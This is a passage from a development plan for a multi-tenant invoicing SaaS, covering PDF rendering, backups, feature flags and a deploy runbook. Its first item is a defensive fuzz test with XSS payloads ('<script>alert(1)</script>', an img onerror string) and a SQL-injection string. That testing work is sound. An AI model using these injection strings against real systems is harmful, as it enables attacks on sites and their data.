5. **Fuzz test the render with hostile inputs before first real send.** Part of Phase 7 test matrix: create an invoice with `businessName = '<script>alert(1)</script>'`, line item with `description = '"><img src=x onerror=alert(1)>'`, customer name with `'; DROP TABLE--`. Render the PDF. Confirm: (a) no script execution in Cloud Run logs, (b) the rendered text shows the literal characters, (c) no broken layout.

This is the highest-severity finding in the entire audit. A successful XSS-to-PDF chain on a pre-launch SaaS is a reputation kill before the first real customer.

### Immutable logo snapshot — protect historical PDFs from "zombie" URLs

The `tenantSnapshot.logoUrl` stored on an invoice is a token-bearing Firebase Storage download URL. That URL stays valid only as long as the underlying object exists in Storage. If a tenant rebrands and deletes their old logo file to clean up Storage, every historical invoice PDF that still references the old URL now renders with a broken-image icon. Same failure mode if a tenant rotates the download token (admin SDK `getDownloadURL()` with a new token invalidates the old one).

This violates the "frozen legal document" guarantee — same category of bug as changing the tax rate on an old invoice.

**Fix — inline the logo into the snapshot at invoice/quote creation time.**

Two equivalent implementations; pick one, apply consistently:

**Option A (recommended) — base64 data URL at snapshot time.**
In `createInvoice` (and `createQuote`), after loading `meta.logoUrl`:
```typescript
// Fetch the bytes once, convert to data URL, store on the snapshot.
const logoRes = await fetch(meta.logoUrl);
if (!logoRes.ok) throw new HttpsError('failed-precondition', 'Tenant logo is unreachable. Re-upload the logo in settings before sending invoices.');
const logoBytes = Buffer.from(await logoRes.arrayBuffer());
const logoMime = logoRes.headers.get('content-type') ?? 'image/png';
const logoDataUrl = `data:${logoMime};base64,${logoBytes.toString('base64')}`;

// Size sanity: reject logos over 500KB — a 500KB image is already unreasonable for an invoice header, and embedding 5MB+ into every invoice doc blows past Firestore's 1MB doc limit.
if (logoBytes.length > 500 * 1024) throw new HttpsError('failed-precondition', 'Logo exceeds 500KB. Re-upload a smaller version in settings.');

// Write to snapshot.
tenantSnapshot.logo = logoDataUrl;  // new field; legacy `logoUrl` can remain null or be dropped
```
Pros: invoices become fully self-contained; Storage file can be deleted with no downstream effect; PDF renders without a network fetch. Cons: invoice docs grow by 50–200KB per logo; the logo bytes are duplicated across every invoice the tenant has ever created (acceptable tradeoff for legal-document frozenness).

**Option B — copy the logo to an immutable Storage path at snapshot time.**
`createInvoice` copies `meta.logoUrl`'s bytes to `tenants/{tenantId}/snapshots/invoices/{invoiceId}/logo.{ext}` using the Admin SDK, generates a download URL for the immutable copy, stores that URL in `tenantSnapshot.logoUrl`. Storage rules block deletes of paths under `snapshots/**` except by platform admin.

Pros: doc size stays small. Cons: an extra Storage object per invoice; Storage bill grows linearly with invoice count; deletion guard must be enforced via rules *and* retained during any future cleanup jobs.

**Which to use:** Option A for MVP. Doc-size growth is bounded (500KB cap), and "fully self-contained invoice" matches the frozen-document mental model better than "the doc points at a file we promised not to delete."

Either way, the `tenantSnapshot.logoUrl` stored *must not* be a mutable Firebase Storage download URL of the tenant's current-logo file. That rule is now part of the `createInvoice`/`createQuote` spec.

### Porting checklist (from old Vite repo's Cloud Run service)

1. Copy the existing `pdf-service/` directory into the new monorepo (or keep it in a separate repo — either works for Cloud Run).
2. Update the HTML template to read from `tenantSnapshot` fields (new: `primaryColor`, `secondaryColor`, `fontFamily`, `faviconUrl`, `currency`, `emailFooter`). Old template only knew about `name`, `logo`, `address`, `taxRate`.
3. ~~Rename `logo` → `logoUrl` in the template~~ — superseded by the immutable logo snapshot: templates read the base64 `tenantSnapshot.logo`.
4. Add `X-Api-Key` header check at the Express middleware level. Reject missing/wrong key with 401.
5. Remove any Firebase Admin SDK or Firestore code from Cloud Run (it's not needed — proxy sends all data).
6. Redeploy under three new service names: `pdf-service-dev`, `pdf-service-staging`, `pdf-service-prod`.

### Per-tenant branding in PDFs
HTML template reads from the **invoice's `tenantSnapshot`** (frozen at creation time):
- Logo (from `tenantSnapshot.logo`, the base64 data URL inlined at creation)
- Business name in header
- Address in footer
- primaryColor, secondaryColor for accent styling (used sparingly — see design rules below)
- fontFamily for text rendering
- `totals.taxes[]` for tax rows (one row per tax, exempt lines marked when an invoice mixes both — D4), plus `businessNumber`

### PDF design rules (the "polished and professional" target)

The PDF is the document customers save, print, and forward to their accountant. It must look like Stripe/QuickBooks/FreshBooks output — not like a tenant's MS Word template.

1. **Black text on white background, always.** No colored body text, no colored table rows.
2. **Brand color used sparingly:** header band behind the logo, the "Total" amount, and one horizontal rule below the header. That's it. Stripe and QuickBooks invoices are almost entirely black-and-white with a single accent color — that restraint is what "premium" reads as.
3. **Single-page for typical invoices.** Paginate cleanly for long line-item lists, with the header (logo + invoice number) repeated on each page and "Page X of Y" in the footer.
4. **Monospace font for amounts.** Right-aligned. Fixed decimal places. Makes totals scannable.
5. **Alternating row shading on the line-item table** at ~3% gray. Subtle, not loud.
6. **Tenant `fontFamily` applies to body text** on customer-facing surfaces (PDF, portal). Admin dashboard stays on Inter — decision from Phase 1.5.

### Payment methods block (bottom of PDF, above the footer)

Every invoice PDF includes a "How to pay" block with both methods, in this order (matching the pay page ordering):

```
────────────────────────────────────────────────
How to pay

1. Interac e-Transfer (preferred — no fees)
   Send to: invoices@acmeplumbing.com
   Memo:    INV-0042
   Note: Most Canadian banks cap e-Transfers at $3,000
   per transaction — request a limit increase from your
   bank if needed, or use the credit card option below.

2. Credit card
   Scan the QR code or visit:
   https://pay.acmeplumbing.com/pay/{shortened-token}

   [QR code rendering of pay URL, ~120×120px]

   ⓘ A 2.4% processing fee applies to credit card
     payments. (Only shown when chargeCustomerCardFees === true.)
────────────────────────────────────────────────
```

**Why both methods on every PDF:** the PDF is what gets printed and filed. A customer who decides three weeks later to pay has the PDF in their records — they need the e-transfer email and the credit card link both available without going back to the email. The QR code handles the "I'm looking at a printed invoice and don't want to type a long URL" case, which is common for residential customers.

**Conditional rendering in the PDF template:**
- If `tenantSnapshot.etransferEmail` is absent → hide section 1, renumber section 2.
- If the tenant has no Stripe Connect account OR the invoice has no `payToken` → hide section 2.
- If both are absent → block invoice send at `createInvoice` time (already specified in Phase 3).

**Surcharge line item on paid-by-card invoices:**

When the Stripe webhook marks an invoice paid via card and `surchargeAmountCents > 0`, a subsequent regenerated "receipt" PDF (or an annotated "paid" version) shows the surcharge as an explicit line in the totals block:

```
Subtotal                $500.00
HST (13%)                $65.00
────────────────────────────────
Invoice Total           $565.00
Credit card fee (2.4%)   $13.56
────────────────────────────────
Total charged           $578.56
Paid via credit card   2026-04-20
```

This is a disclosure requirement (customer must see what they actually paid) and also makes the accounting export unambiguous. The PDF template branches on `paidVia === 'card' && surchargeAmountCents > 0` to render this block.

### QR code generation in the PDF

The Cloud Run `pdf-service` uses [`qrcode`](https://www.npmjs.com/package/qrcode) (MIT license) to generate a QR code as a data URL inline-embedded in the HTML before Puppeteer renders. No external image fetch at render time — keeps the PDF self-contained.

```typescript
import QRCode from 'qrcode';
const payUrl = `${platformBaseUrl}/pay/${invoice.payToken}`;
const qrDataUrl = await QRCode.toDataURL(payUrl, { width: 120, margin: 1 });
// pass qrDataUrl into the HTML template as a <img src={qrDataUrl} />
```

**Estimated effort:** 2–3 days (+ ~0.5 day for payment block design iteration and QR code integration)

---

## Phase 7 — Testing, Cleanup, First Onboarding

### Test matrix
1. **Create 2–3 test tenants end-to-end:**
   - Signup → custom claims set correctly
   - Settings → edit business info, upload logo
   - Stripe Connect → complete onboarding (test mode)
   - Create customer
   - Create invoice → number increments per-tenant
   - Send invoice email
   - Preview + download PDF
   - Pay via Stripe checkout (test mode)
   - Create recurring invoice (if `recurringInvoices` feature enabled)
   - Create quote (if `quotes` feature enabled)

2. **Firestore rules verification (emulator):**
   - Tenant A cannot read Tenant B's data at any path
   - Tenant A cannot write to their own `entitlements` doc
   - No client (platform admin included) can write `entitlements`; the platform admin edits them in the Firebase Console
   - User without `tenantId` claim cannot read anything
   - Logged-out user cannot read anything

3. **Cloud Functions verification:**
   - Every feature-gated function rejects calls from tenants without that feature
   - Every function rejects calls without auth
   - Stripe webhook routes correctly to the right tenant

4. **PDF endpoint verification:**
   - Rejects unauthenticated requests
   - **Tenant auth path:**
     - Accepts caller whose `tenantId` claim matches the invoice's parent tenant
     - Rejects caller whose `tenantId` claim ≠ invoice's tenantId
   - **Customer auth path:**
     - Accepts customer whose verified email matches invoice's `customer.email` (no `tenantId` claim, `email_verified: true`)
     - Rejects customer whose verified email does NOT match invoice's `customer.email` (different customer trying to read someone else's invoice)
     - Rejects customer with `email_verified: false` even if email would match
   - Respects per-tenant branding (reads from `tenantSnapshot`, NOT current meta — verify by mutating `meta` after invoice creation and confirming the PDF still renders the old branding)

5. **Customer portal end-to-end flow (critical — tests the entire customer experience):**
   - Contractor creates invoice for a customer email address
   - Contractor sends invoice email → verify email arrives with correct portal URL (custom domain if configured, generic otherwise)
   - Customer clicks "View & Pay Invoice" link in email
   - Customer lands on branded login page (correct logo, colors, font for that contractor)
   - Customer enters email → magic link sent → verify magic link email arrives
   - Customer clicks magic link → authenticated, redirected back to invoice view
   - Invoice renders with correct `tenantSnapshot` branding (not TechFlow branding)
   - Customer clicks Pay → Stripe checkout opens on the contractor's Connect account (test mode)
   - Customer completes payment → webhook fires → invoice status updates to "paid"
   - Customer downloads PDF → PDF renders with correct branding from snapshot
   - **Multi-tenant verification:** customer has invoices from 2+ contractors → list page shows correct branding per invoice, not mixed
   - **Return visit:** customer closes browser, returns to portal URL → still authenticated, sees all their invoices without re-entering magic link

6. **Staff invitation flow verification:**
   - Owner invites staff member via `/settings/team` → invite doc created, email sent
   - Invitee clicks link with matching email → accepts invite → `tenantId` + `role` claims set, `users/{uid}` doc created, `acceptedAt` stamped
   - Invitee clicks link with DIFFERENT email signed in → rejected with clear error
   - Invite past `expiresAt` → rejected
   - Invite already accepted (re-use of link) → rejected (one-time use)
   - Owner revokes pending invite → invite stamped `revokedAt`, link no longer works
   - Invitee already belongs to a different tenant → rejected (one-user-one-tenant MVP constraint)

7. **Observability verification:**
   - Trigger a handled exception in a Cloud Function → Sentry receives it with correct `tenantId` + `uid` tags
   - Trigger a client-side error in the portal → Sentry receives it with correct customer email tag

8. **Custom domain verification (if Phase 5 custom domains are complete):**
   - Set `customDomain` on a test tenant → Cloud Function adds Vercel domain + Firebase Auth authorized domain + `customDomains/{domain}` doc
   - Access the custom domain → middleware resolves correct tenant → branded login page renders
   - Magic link flow works on the custom domain (Firebase Auth authorized domains list is correct)
   - Remove `customDomain` → Cloud Function cleans up all three (Vercel, Firebase Auth, Firestore)

### Cleanup
- Delete test tenants
- Remove any `console.log` debug output
- Verify no stale Puppeteer test route was left on the marketing site (there shouldn't be — Cloud Run is the locked path — but double-check)
- Document env vars required for production — done (Environment Strategy & Deploy Runbook)
- Document the platform admin Firestore console procedure for flipping features — done (Feature Flag System → Platform admin workflow)

### First real onboarding
- Reggie walks through the signup flow as if he were a real customer
- Full end-to-end exercise on production Firebase
- Fix anything that felt awkward

**Estimated effort:** 3–5 days

---

## Firestore Backup Strategy

**Why this exists:** multi-tenant means one Firestore database holds every tenant's data. A bad deploy, a bug in a Cloud Function, a rule regression, or even a rm-rf-style Firebase CLI mistake can affect all tenants simultaneously. Backups are not optional — they're the difference between "we restored yesterday's snapshot" and "we lost everyone's invoices."

### Three layers of defense

**1. Point-in-Time Recovery (PITR) — always on.**
- Firestore's native PITR keeps per-second snapshots for the previous 7 days.
- Enabled in Firebase Console under Firestore → Settings → "Point-in-time recovery."
- Pricing: small storage cost proportional to database size. Trivial at the scale of this app (estimated <$5/month at 50 tenants).
- Restore granularity: whole database, to any timestamp in the last 7 days.
- **Use case:** someone ran a bad script 2 hours ago, need to roll back.

**2. Scheduled managed exports — daily, 30-day retention.**
- Firestore managed export to a Cloud Storage bucket, triggered by Cloud Scheduler → Cloud Function.
- Runs daily at 03:00 UTC (low-traffic window).
- Destination bucket: `gs://{projectId}-firestore-backups/daily/{YYYY-MM-DD}/`, created in `northamerica-northeast2`.
- Lifecycle rule on the bucket: delete objects older than 30 days automatically.
- **Use case:** PITR window missed (>7 days ago), regulatory "we need last month's state," or disaster recovery to a different project.

**3. Manual snapshot before risky deploys — convention, not automation.**
- Before deploying: rule changes, Cloud Function changes touching multiple collections, or any schema migration.
- One command: `gcloud firestore export gs://{projectId}-firestore-backups/manual/$(date +%Y%m%d-%H%M%S)`
- Kept until the deploy is confirmed stable (usually 48 hours), then deleted manually or left for the 30-day lifecycle.
- **Use case:** rollback path if the deploy breaks something the tests didn't catch.

### Implementation — Cloud Function for scheduled export

```typescript
// functions/src/scheduled/firestoreExport.ts
import { onSchedule } from 'firebase-functions/v2/scheduler';
import { google } from 'googleapis';

export const scheduledFirestoreExport = onSchedule(
  { schedule: 'every day 03:00', timeZone: 'UTC', region: SCHEDULER_REGION },  // northamerica-northeast1 (D2)
  async () => {
    const firestore = google.firestore('v1');
    const projectId = process.env.GCLOUD_PROJECT!;
    const bucket = `gs://${projectId}-firestore-backups`;
    const timestamp = new Date().toISOString().slice(0, 10);

    await firestore.projects.databases.exportDocuments({
      name: `projects/${projectId}/databases/(default)`,
      requestBody: {
        outputUriPrefix: `${bucket}/daily/${timestamp}`,
        // collectionIds: []  // empty = export all collections
      },
    });
  }
);
```

Requires:
- Cloud Storage bucket created: `{projectId}-firestore-backups`
- Bucket lifecycle rule: delete objects 30 days after creation
- Service account for Cloud Functions needs `datastore.databases.export` + `storage.objects.create` on the bucket
- One-time IAM setup during Phase 1

### Restore procedures (documented, not scripted)

**Scenario A: "Undo the last hour" (PITR, whole DB).**
```
# Firebase Console → Firestore → Import/Export → Restore from PITR
# Pick a timestamp from the last 7 days
# Restores to a NEW database in the same project, then swap
```

**Scenario B: "Yesterday's full snapshot."**
```
gcloud firestore import gs://{projectId}-firestore-backups/daily/2026-04-10
# Restores all collections to the target database
```

**Scenario C: "Restore just one tenant's data."**
Not supported natively. Manual procedure:
1. Import yesterday's backup to a scratch Firebase project.
2. Script that reads `tenants/{targetTenantId}` subtree from scratch project and writes it back to production.
3. Overwrites live data for that tenant only.

This is the "surgical restore" path and it's slow and manual. Document it now; don't build tooling for it until it's needed.

**Scenario D: "The entire production Firebase project is gone."**
- Scheduled exports in Cloud Storage survive a Firebase project deletion as long as the Cloud Storage bucket is in a separate project (or at least the bucket itself is preserved).
- **Hardening recommendation:** the backup bucket should live in a DIFFERENT GCP project from the Firestore database. Compromises the one-dashboard-convenience but gives you a true air-gap.
- Decision: defer to Phase 1 implementation — start with same-project backups, move to separate-project backups if it proves easy. Same-project is still better than no backups.

### Testing the backup procedure

Before launch, run the restore procedure at least once end-to-end:
1. Create test data in production Firestore.
2. Wait for scheduled export (or trigger manually).
3. Delete the test data from production.
4. Restore from the export.
5. Confirm data is back.

**This test is mandatory before onboarding the first real client.** Untested backups are not backups — they're hopes.

### Cost estimate
- PITR: <$5/month at 50 tenants
- Scheduled exports + 30-day retention: <$2/month at current data sizes (invoicing data is tiny)
- Cloud Scheduler: free tier
- Cloud Function invocations: free tier (one per day)

**Total: <$10/month for the full backup posture.** Cheapest insurance in the stack.

**Estimated effort for initial setup:** 1–2 days (bucket creation, IAM, Cloud Function, lifecycle rules, first test restore)

---

## Feature Flag System — Full Reference

### Why this exists
- **Pricing tier foundation.** Later, Stripe subscription webhook writes to `entitlements.plan`, which maps to a features bundle. No frontend changes needed.
- **Per-tenant toggles.** Manual control during soft-launch or beta of new features.
- **Kill-switch.** Disable a feature for a problem tenant without a deploy.
- **Code-canonical safety.** New features added to the code constant are immediately defaulted safely for every tenant — no migration, no race between deploy and backfill.

### Architecture rules
1. **Feature list lives in `lib/features.ts` as a `const` object.** Source of truth is code, not the database.
2. **Tenant `entitlements` doc only stores overrides.** Missing keys fall through to defaults.
3. **Two layers of enforcement, always:**
   - Frontend gating (hooks, `<FeatureGate>`, route guards, nav filtering) = UX
   - Cloud Function `requireFeature()` = security
4. **Never enforce features in Firestore rules** (too expensive, causes doc-read cost on every write). Enforce at the Cloud Function layer instead.
5. **Tenants can read their own entitlements but cannot write.** No client can write them — the platform admin edits `entitlements/current` in the Firebase Console. Splitting `entitlements` from `meta` is what makes this rule enforceable.

### Canonical feature keys (as built)

| Key | Default | Gates |
|---|---|---|
| `invoices` | true | Invoice callables, invoice PDF, pay flow |
| `quotes` | true | Quote callables, quote PDF, `convertQuoteToInvoice` (with `invoices`) |
| `recurringInvoices` | false | `createRecurringInvoice`; per-tenant check in `processRecurringInvoices` |
| `stripePayments` | false | Stripe Connect onboarding, `/billing`, billing banner, card checkout |
| `customDomain` | false | `setupCustomDomain` and `/settings/domain` |
| `cardSurcharge` | false | Card surcharging (D3) — keep off until credit-only card detection exists |
| `etransfer` | true | Reserved — not checked; e-Transfer display is driven by `meta.etransferEmail` |
| `stripeConnect` | false | Reserved — not checked anywhere |
| `multiCurrency` | false | Reserved — not checked; currency is `CAD` \| `USD` per tenant |

The April list's `customers` (always on, never gated) and `bookingSystem` (future placeholder) are not in code.

### Plan → feature bundles (sketch, not wired yet)
```typescript
const PLAN_FEATURES = {
  free:    { invoices: true, customers: true },
  starter: { ...PLAN_FEATURES.free, quotes: true },
  pro:     { ...PLAN_FEATURES.starter, recurringInvoices: true, stripePayments: true },
};
```
This mapping is consumed by the Stripe subscription webhook (future phase), not at runtime in the app. The app just reads `entitlements.features` and doesn't care how they got there.

### Platform admin workflow (MVP)
Until an admin UI exists:
1. Log into Firebase Console
2. Navigate to `tenants/{tenantId}/entitlements/current`
3. Edit the `features` object directly
4. Tenant picks up change on next page load (real-time listener)

### Limits (non-feature entitlements)
As built, `entitlements/current.maxInvoicesPerMonth` exists (`onSignup` writes 10) but nothing enforces it yet. Planned shape — enforced inside Cloud Functions alongside feature checks:
```typescript
{ maxInvoicesPerMonth: 10, maxCustomers: 50 }
```
Not MVP-critical. Shape is reserved so it can be added later without schema migration.

---

## Environment Strategy & Deploy Runbook

**Set up per environment from day one.** Mixing dev and production credentials is how you charge real cards in test mode or corrupt live data. Nothing is deployed as of 2026-09-13; this section is the checklist to follow, and it replaces the operational notes that previously lived outside the repo.

### Three environments

| Environment | Firebase project | Stripe | Vercel env scope |
|---|---|---|---|
| Development | `techflow-saas-dev` (exists; Firestore in `northamerica-northeast2`) | test mode | `development` |
| Staging | `techflow-saas-staging` — create before Phase 7 testing | test mode, separate webhook endpoints | `preview` |
| Production | `techflow-saas-prod` — create before the first client | live mode | `production` |

`.firebaserc` aliases: `dev`, `staging`, `prod`. Local development runs on the emulators (`npm run emulators:functions`, `npm run seed:emulator`, `NEXT_PUBLIC_USE_EMULATORS=1`).

### Regions (D2 — permanent, set at creation)

| Resource | Region |
|---|---|
| Firestore `(default)` database | `northamerica-northeast2` (Toronto) — enable PITR and delete protection in prod |
| Cloud Storage default bucket | `northamerica-northeast2` |
| Backup bucket `{projectId}-firestore-backups` | `northamerica-northeast2`, lifecycle rule: delete after 30 days |
| Callables, HTTP functions, Firestore triggers | `northamerica-northeast2` (`functions/src/shared/globalOptions.ts`) |
| Scheduled functions and Cloud Scheduler jobs | `northamerica-northeast1` (Montréal — Scheduler isn't offered in Toronto) |
| Cloud Run `pdf-service-{env}` | `northamerica-northeast2` |
| Vercel functions | `yul1` (Montréal, `vercel.json`) |
| Amazon SES | `ca-central-1` — must be the region that holds production access |

### Vercel environment variables (per scope)

| Variable | Used by |
|---|---|
| `NEXT_PUBLIC_FIREBASE_API_KEY`, `NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN`, `NEXT_PUBLIC_FIREBASE_PROJECT_ID`, `NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET`, `NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID`, `NEXT_PUBLIC_FIREBASE_APP_ID` | Firebase client SDK |
| `NEXT_PUBLIC_FIREBASE_FUNCTIONS_REGION` | optional override; default `northamerica-northeast2` |
| `NEXT_PUBLIC_APP_URL` | pay links in PDFs (`https://portal.techflowsolutions.ca` in prod) |
| `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` | pay page (when built) |
| `NEXT_PUBLIC_SENTRY_DSN`, `SENTRY_DSN` | Sentry client and server (only load once A-01 is fixed) |
| `FIREBASE_ADMIN_CLIENT_EMAIL`, `FIREBASE_ADMIN_PRIVATE_KEY` | Admin SDK in middleware, PDF routes, webhooks, branded pages — store the key with escaped `\n` |
| `STRIPE_SECRET_KEY` | webhook auto-refunds |
| `STRIPE_PLATFORM_WEBHOOK_SECRET`, `STRIPE_CONNECT_WEBHOOK_SECRET` | the two webhook routes |
| `PDF_SERVICE_URL`, `PDF_SERVICE_API_KEY` | `/api/pdf/*` proxy |
| `EDGE_CONFIG` (read connection string), `EDGE_CONFIG_ID`, `VERCEL_API_TOKEN`, `VERCEL_TEAM_ID` | custom-domain cache |
| `PORTAL_GENERIC_HOST` | optional; default `portal.techflowsolutions.ca` |

The Next.js app sends no email and needs no AWS credentials (D5).

### Cloud Functions secrets — `firebase functions:secrets:set NAME --project <projectId>`

| Secret | Used by |
|---|---|
| `PAY_TOKEN_SECRET` | pay-token sign/verify. Unique per environment (`openssl rand -base64 48`); rotating it invalidates every outstanding pay link |
| `STRIPE_SECRET_KEY` | Connect onboarding, checkout |
| `PDF_SERVICE_API_KEY` | `previewInvoicePDF`, `previewQuotePDF` |
| `AWS_SES_ACCESS_KEY_ID`, `AWS_SES_SECRET_ACCESS_KEY` | every email sender (D5) |
| `VERCEL_API_TOKEN`, `VERCEL_PROJECT_ID`, `VERCEL_TEAM_ID`, `EDGE_CONFIG_ID` | custom-domain provisioning and the 5-minute re-check |

`functions/src/shared/stripe.ts` also declares `STRIPE_PLATFORM_WEBHOOK_SECRET` and `STRIPE_CONNECT_WEBHOOK_SECRET`, but no deployed function binds them — the webhooks run on Vercel.

### Cloud Functions non-secret config — `functions/.env.<projectId>`

| Variable | Default | Notes |
|---|---|---|
| `APP_URL` | `https://portal.techflowsolutions.ca` | links in emails, Stripe redirect URLs, invitation accept URL |
| `PDF_SERVICE_URL` | — | the deterministic Cloud Run URL (below) |
| `SES_REGION` | `ca-central-1` | |
| `EMAIL_FROM_ADDRESS` | `notifications@techflowsolutions.ca` | must belong to a verified SES identity |
| `SES_CONFIGURATION_SET` | — | required for bounce/complaint events |
| `SES_EVENTS_TOPIC_ARN` | — | the only SNS topic `sesEventsWebhook` accepts |
| `SES_TENANTS_ENABLED` | `false` | set `true` only after SES tenants are provisioned |

Vercel env vars and Cloud Functions secrets are parallel systems — both must be populated for every environment; a value present in one is `undefined` in the other.

### Deploy runbook (per environment, in order)

**1. Google Cloud and Firebase**
- Create the project; Firestore Native in `northamerica-northeast2`; the default Storage bucket in `northamerica-northeast2`.
- Enable APIs: Cloud Functions, Cloud Run, Cloud Build, Artifact Registry, Eventarc, Cloud Scheduler, Secret Manager, Identity Toolkit.
- Prod: enable Firestore PITR and delete protection.
- Backups: create `{projectId}-firestore-backups` in the same region with a 30-day lifecycle rule; grant the functions service account `datastore.databases.export` and object create on the bucket.
- Firestore TTL policies: collection group `payAttempts` on `expireAt`; `stripeEvents` on `expireAt`; `emailSends` on `expireAt`.
- Run the emulator suites, take a manual export, then `firebase deploy --only firestore:rules,firestore:indexes,storage --project <projectId>` (fix A-04 first).
- Set the functions secrets and `functions/.env.<projectId>`, then `firebase deploy --only functions --project <projectId>`.
- Firebase Auth: authorized domains include the portal domain (custom domains are added by `setupCustomDomain`); password-reset and verification email action URL → `https://<portal-domain>/auth/action`; **SMTP settings → SES SMTP credentials**, so auth emails send from the platform domain instead of `*.firebaseapp.com`.
- Platform admin: `npx ts-node functions/src/scripts/setPlatformAdmin.ts <uid> <email>` with application default credentials.

**2. Cloud Run `pdf-service`**
- `gcloud run deploy pdf-service-<env> --source ./pdf-service --region northamerica-northeast2 --memory 2Gi --cpu 2 --allow-unauthenticated` with `PDF_SERVICE_API_KEY` from Secret Manager (the API key, not IAM, protects the service); prod adds `--min-instances 1` (P3).
- **R3, resolved differently:** Cloud Run domain mappings aren't offered in `northamerica-northeast2`. Use the deterministic URL `https://pdf-service-<env>-<PROJECT_NUMBER>.northamerica-northeast2.run.app` — it depends only on service name, project number, and region, so recreating the service keeps it. Set it as `PDF_SERVICE_URL` in both Vercel and functions.

**3. Vercel**
- One project (marketing site + portal) with `vercel.json` regions `yul1`, the env vars above per scope, and the `portal.techflowsolutions.ca` domain (Cloudflare DNS record set to DNS-only, not proxied).
- Create and connect an Edge Config store (`EDGE_CONFIG`); create a token with Domains and Edge Config scopes for the functions secrets.

**4. Stripe** (test mode for dev and staging, live for prod)
- Complete the Connect platform profile (D1 accounts: Stripe-liable, full dashboard).
- Endpoint, scope *Your account*: `https://<portal>/api/webhooks/stripe/platform` → `STRIPE_PLATFORM_WEBHOOK_SECRET`.
- Endpoint, scope *Connected accounts*: `https://<portal>/api/webhooks/stripe/connect` with `checkout.session.completed`, `payment_intent.payment_failed`, `charge.refunded`, `charge.dispute.created`, `charge.dispute.closed`, `account.updated`, `account.application.deauthorized` → `STRIPE_CONNECT_WEBHOOK_SECRET`.

**5. Amazon SES** (`ca-central-1`)
- Domain identity `techflowsolutions.ca` with Easy DKIM: the three CNAMEs go in Cloudflare as DNS-only. The existing DMARC policy (`p=quarantine`) is satisfied by DKIM alignment.
- Custom MAIL FROM subdomain (e.g. `mail.techflowsolutions.ca`: MX `feedback-smtp.ca-central-1.amazonses.com` and TXT `v=spf1 include:amazonses.com ~all`). This keeps SPF aligned without touching the root SPF record Zoho Mail relies on.
- IAM user limited to `ses:SendEmail` on the identity (optionally conditioned on `ses:FromAddress`); its access keys become the two AWS secrets.
- Configuration set (e.g. `techflow-transactional`) with an SNS event destination for Delivery, Bounce, Complaint, DeliveryDelay, and Reject → SNS topic → HTTPS subscription to the `sesEventsWebhook` URL (confirmed automatically). Set `SES_CONFIGURATION_SET` and `SES_EVENTS_TOPIC_ARN`.
- SES SMTP credentials → Firebase Auth SMTP settings (step 1).
- Later: one SES tenant per TechFlow tenant (identity and configuration set associated), then `SES_TENANTS_ENABLED=true`.

**6. Before the first onboarding** — run the Phase 7 matrix on staging, perform the backup restore drill, and complete the Old-Repo Shutdown Checklist (delete the old Vite project's Cloud Functions and GitHub Pages site).

### Secret rotation (P4)

- `PDF_SERVICE_API_KEY`: allow old and new keys briefly, update Vercel and the functions secret, redeploy, remove the old key.
- Stripe webhook secrets: roll in the Stripe Dashboard, update Vercel, redeploy.
- Firebase Admin private key: create a new key, update Vercel, redeploy, delete the old key.
- AWS SES access keys: create a second key, update both secrets, redeploy functions, deactivate then delete the old key.
- `PAY_TOKEN_SECRET`: only on suspected exposure — it invalidates every outstanding pay link.
- Cadence: shared secrets every 90 days; immediately on suspected exposure.

### Setup rules

- Never commit `.env*` or `.secret.local` (both gitignored). Secrets live only in Vercel env and Google Secret Manager.
- Before any `firebase deploy`, run the emulator test suites and verify against a fake tenant (CLAUDE.md).
- Vercel deploys on git push; Firebase does not — deploy functions, rules, and indexes explicitly per project.

---

## What NOT to do (guardrails against future scope creep)

- **Do not migrate the old Vite repo to multi-tenant.** It's being replaced, not upgraded.
- **Do not add features beyond the canonical list during the rebuild.** `bookingSystem` is a placeholder, not a deliverable.
- **Do not build the platform admin UI yet.** Firebase Console is the MVP admin tool.
- **Do not enforce feature flags in Firestore rules.** Cloud Functions only.
- **Do not ship without the Stripe webhook auth + tenant routing working correctly.** This is the most dangerous code path in the whole app.
- **Do not add plain CSS files "just for one thing."** Tailwind or nothing.
- **Do not defer the Cloud Functions auth checks.** Every function has `auth + tenantId + featureGate` from its first commit. No "add security later" pattern.
